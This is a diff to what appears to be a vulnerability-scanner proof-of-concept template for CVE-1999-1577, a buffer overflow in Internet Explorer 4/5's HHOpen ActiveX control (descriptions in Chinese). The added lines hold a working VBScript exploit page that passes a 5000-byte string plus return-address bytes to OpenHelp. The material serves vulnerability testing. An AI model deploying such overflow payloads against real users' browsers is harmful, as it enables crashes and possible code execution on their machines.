@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证 Microsoft Internet Explorer 4.01/5.0 中 HHOpen ActiveX 控件 (hhopen.ocx) OpenHelp 方法缓冲区溢出漏洞。通过构造恶意 HTML 页面调用 ActiveX 控件的 OpenHelp 方法传递超长字符串触发缓冲区溢出。"
+description = "Microsoft Internet Explorer 4.01/5中HHOpen ActiveX控件(hhopen.ocx)缓冲区溢出漏洞PoC。通过构造包含VBScript的恶意HTML页面，实例化CLSID 130D7743-5F5A-11D1-B676-00A0C9697233的HHOpen控件并调用OpenHelp方法传入超长字符串参数，触发栈缓冲区溢出导致IE崩溃，验证漏洞存在"
 id = "POC-AVE-1999-1195"
-name = "CVE-1999-1577 PoC - Microsoft IE HHOpen ActiveX Buffer Overflow"
+name = "CVE-1999-1577 PoC"
 severity = "medium"
 tags = ["ave-1999-1195"]
 vuln_id = [
@@ -15,27 +15,26 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/poc.html"
+path = "/{{BaseURL}}/"
 protocol = "http"
 
 [poc.requests.body]
-content = ""
+content = """
+<html>
+<body>
+<object classid="clsid:130D7743-5F5A-11D1-B676-00A0C9697233" id="hhopen"></object>
+<script language="vbscript">
+expstr = String(5000, "A")
+expstr = expstr & Chr(202) & Chr(212) & Chr(248) & Chr(191)
+hhopen.OpenHelp "Winhlp32.hlp", expstr
+</script>
+</body>
+</html>
+"""
 type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    "HHOpen",
-    "OpenHelp",
-    "CLSID:ADB880A6-D8FF-11CF-9377-00AA003B7A11",
-]
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
+words = ["130D7743-5F5A-11D1-B676-00A0C9697233"]
